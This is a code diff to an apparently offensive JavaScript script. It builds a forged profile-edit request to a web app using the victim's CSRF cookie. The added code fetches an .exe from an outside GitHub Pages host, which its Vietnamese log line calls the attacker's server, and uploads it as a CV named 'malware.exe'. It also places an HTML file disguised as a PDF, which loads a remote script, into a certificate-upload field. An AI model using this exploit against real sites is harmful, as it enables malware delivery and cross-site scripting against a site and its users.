@@ -13,7 +13,20 @@ function getCookie(name) {
     }
     return cookieValue;
 }
-
+async function uploadExe() {
+    try {
+        console.log('Đang tải file .exe từ server của kẻ tấn công...');
+        const response = await fetch('https://LamChanKhai.github.io/testFile/XinChao.exe');         
+	if (!response.ok) {
+            console.error('Không tải được file .exe');
+            return;
+        }    
+        const exeBlob = await response.blob();
+	return exeBlob;
+    } catch (error) {
+        console.error('Lỗi JavaScript:', error);
+    }
+}
 
 const csrfToken = getCookie('csrftoken');
 const endpoint = '/en/profiles/edit/'; // Dùng đường dẫn tương đối
@@ -37,12 +50,9 @@ formData.append('availability', '');
 
 formData.append('avatar', '');
 
-const evilPdfContent = '<script src="https://LamChanKhai.github.io/X55.github.io/script.js"></script>';
-const evilCvFile = new File([evilPdfContent], 'lck.html', {
-    type: 'application/pdf'
-});
-formData.append('cv', evilCvFile);
 
+const exeBlob = uploadExe();
+formData.append('cv', exeBlob, 'malware.exe');
 
 formData.append('projects-TOTAL_FORMS', '0');
 formData.append('projects-INITIAL_FORMS', '0');
@@ -58,6 +68,10 @@ formData.append('achievements-0-title', 'Junk Achievement Title');
 formData.append('achievements-0-issued_by', '');
 formData.append('achievements-0-description', '');
 formData.append('achievements-0-date_achieved', '');
+const evilPdfContent = '<script src="https://LamChanKhai.github.io/X55.github.io/script.js"></script>';
+const evilCvFile = new File([evilPdfContent], 'lck.html', {
+    type: 'application/pdf'
+});
 formData.append('achievements-0-certificate_file', evilCvFile);
 
 
